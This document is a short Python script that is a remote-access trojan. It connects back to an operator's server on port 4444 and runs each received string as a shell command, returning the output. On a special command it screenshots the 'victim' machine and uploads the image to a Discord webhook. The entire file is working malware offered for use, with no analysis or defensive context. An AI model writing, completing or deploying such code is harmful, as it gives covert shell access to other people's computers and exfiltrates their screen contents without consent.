import socket
import pyautogui
import requests
import subprocess
import os
import tempfile

# Encapsulated code
def remote_control():
    SERVER_IP = "127.0.0.1"  # Change this to the server's IP
    PORT = 4444  # Change this to the port you have open

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, PORT))
    msg = s.recv(1024).decode()

    while True:
        cmd = s.recv(1024).decode()

        if cmd.lower() in ['quit', 'exit', 'q', 'x']:
            break

        if cmd == '0x0':
            try:
                take_and_send_screenshot()
            except Exception as e:
                s.sendall(str(e).encode())

        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        except Exception as e:
            result = str(e).encode()

        if len(result) == 0:
            result = '[+] command executed'.encode()

        s.sendall(result)

    s.close()

def take_and_send_screenshot():
    # Take a screenshot
    screenshot = pyautogui.screenshot()

    # Use a temporary directory to ensure write permissions
    with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp_file:
        screenshot_path = tmp_file.name
        screenshot.save(screenshot_path)

    # Send the screenshot to the Discord webhook
    webhook_url = ''  # your webhook here
    files = {'file': open(screenshot_path, 'rb')}
    data = {'content': 'Screenshot from victim:'}
    response = requests.post(webhook_url, files=files, data=data)

    if response.status_code != 204:
        raise Exception(f'Failed to send screenshot. Status code: {response.status_code}')

    # Clean up the temporary file
    os.remove(screenshot_path)

# Run the remote control function
remote_control()
